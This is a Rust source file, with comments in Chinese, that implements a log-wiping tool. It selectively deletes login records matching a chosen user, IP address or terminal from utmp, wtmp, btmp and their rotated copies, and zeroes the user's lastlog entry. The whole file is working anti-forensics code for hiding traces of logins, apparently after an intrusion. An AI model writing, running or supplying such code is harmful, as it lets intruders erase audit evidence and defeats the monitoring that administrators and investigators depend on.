use std::fs;
use std::io::{self, Seek, Write};
use std::path::Path;

// Linux utmp 结构体：固定 384 字节/条目
// 参考 /usr/include/bits/utmp.h
const UT_LINESIZE: usize = 32;
const UT_HOSTSIZE: usize = 256;
const UTMP_ENTRY_SIZE: usize = 384;

#[derive(Debug)]
pub struct UtmpEntry {
    pub raw: [u8; UTMP_ENTRY_SIZE],
}

impl UtmpEntry {
    fn ut_user(&self) -> String {
        extract_cstr(&self.raw[44..44 + UT_LINESIZE])
    }

    fn ut_line(&self) -> String {
        extract_cstr(&self.raw[8..8 + UT_LINESIZE])
    }

    fn ut_host(&self) -> String {
        extract_cstr(&self.raw[76..76 + UT_HOSTSIZE])
    }

    fn matches(&self, user: Option<&str>, ip: Option<&str>, tty: Option<&str>) -> bool {
        if let Some(u) = user {
            if self.ut_user() != u {
                return false;
            }
        }
        if let Some(i) = ip {
            if !self.ut_host().contains(i) {
                return false;
            }
        }
        if let Some(t) = tty {
            if !self.ut_line().contains(t) {
                return false;
            }
        }
        // 至少需要一个筛选条件
        user.is_some() || ip.is_some() || tty.is_some()
    }
}

fn extract_cstr(bytes: &[u8]) -> String {
    let end = bytes.iter().position(|&b| b == 0).unwrap_or(bytes.len());
    String::from_utf8_lossy(&bytes[..end]).to_string()
}

fn read_utmp_entries(path: &Path) -> io::Result<Vec<UtmpEntry>> {
    let data = fs::read(path)?;
    let mut entries = Vec::new();
    for chunk in data.chunks_exact(UTMP_ENTRY_SIZE) {
        let mut raw = [0u8; UTMP_ENTRY_SIZE];
        raw.copy_from_slice(chunk);
        entries.push(UtmpEntry { raw });
    }
    Ok(entries)
}

pub fn selective_clean_utmp(
    path: &Path,
    user: Option<&str>,
    ip: Option<&str>,
    tty: Option<&str>,
    dry_run: bool,
) -> io::Result<u32> {
    let entries = read_utmp_entries(path)?;
    let mut removed = 0u32;

    let remaining: Vec<&UtmpEntry> = entries
        .iter()
        .filter(|e| {
            if e.matches(user, ip, tty) {
                removed += 1;
                if dry_run {
                    println!(
                        "[预览] 移除 {} 条目: user={} host={} line={}",
                        path.display(),
                        e.ut_user(),
                        e.ut_host(),
                        e.ut_line()
                    );
                }
                false
            } else {
                true
            }
        })
        .collect();

    if !dry_run && removed > 0 {
        let mut file = fs::OpenOptions::new()
            .write(true)
            .truncate(true)
            .open(path)?;
        for entry in &remaining {
            file.write_all(&entry.raw)?;
        }
        file.flush()?;
        println!(
            "[清除] {} — 移除 {} 条记录，保留 {} 条",
            path.display(),
            removed,
            remaining.len()
        );
    }

    Ok(removed)
}

pub fn clean_lastlog(
    user: Option<&str>,
    dry_run: bool,
) -> io::Result<()> {
    let path = Path::new("/var/log/lastlog");
    if !path.exists() {
        return Ok(());
    }

    let username = match user {
        Some(u) => u,
        None => return Ok(()),
    };

    // 通过 getpwnam 获取 UID
    let uid = unsafe {
        let c_name = std::ffi::CString::new(username).unwrap();
        let pw = libc::getpwnam(c_name.as_ptr());
        if pw.is_null() {
            eprintln!("[跳过] 用户 {} 不存在", username);
            return Ok(());
        }
        (*pw).pw_uid as u64
    };

    // lastlog 文件结构：按 UID 偏移，每条 292 字节
    // 实际大小取决于 time_t，在 64 位系统上可能是 296
    let entry_size = detect_lastlog_entry_size(path)?;
    let offset = uid * entry_size as u64;

    if dry_run {
        println!("[预览] 清零 lastlog 条目: user={} uid={} offset={}", username, uid, offset);
        return Ok(());
    }

    let mut file = fs::OpenOptions::new().write(true).open(path)?;
    file.seek(io::SeekFrom::Start(offset))?;
    let zeros = vec![0u8; entry_size];
    file.write_all(&zeros)?;
    file.flush()?;
    println!("[清除] lastlog — 已清零 {} (uid={}) 的记录", username, uid);

    Ok(())
}

fn detect_lastlog_entry_size(path: &Path) -> io::Result<usize> {
    let meta = fs::metadata(path)?;
    let size = meta.len();
    // 尝试 292 (32-bit time_t) 和 296 (64-bit time_t)
    if size % 296 == 0 {
        Ok(296)
    } else {
        Ok(292)
    }
}

pub fn clean_all_login_records(
    user: Option<&str>,
    ip: Option<&str>,
    tty: Option<&str>,
    dry_run: bool,
) {
    let utmp_files = ["/var/run/utmp", "/var/log/wtmp", "/var/log/btmp",
                      "/var/log/wtmp.1", "/var/log/btmp.1"];

    for path_str in &utmp_files {
        let path = Path::new(path_str);
        if path.exists() {
            match selective_clean_utmp(path, user, ip, tty, dry_run) {
                Ok(n) if n > 0 => {}
                Ok(_) => println!("[信息] {} — 没有匹配的条目", path.display()),
                Err(e) => eprintln!("[失败] {} — {}", path.display(), e),
            }
        }
    }

    if let Err(e) = clean_lastlog(user, dry_run) {
        eprintln!("[失败] lastlog — {}", e);
    }
}
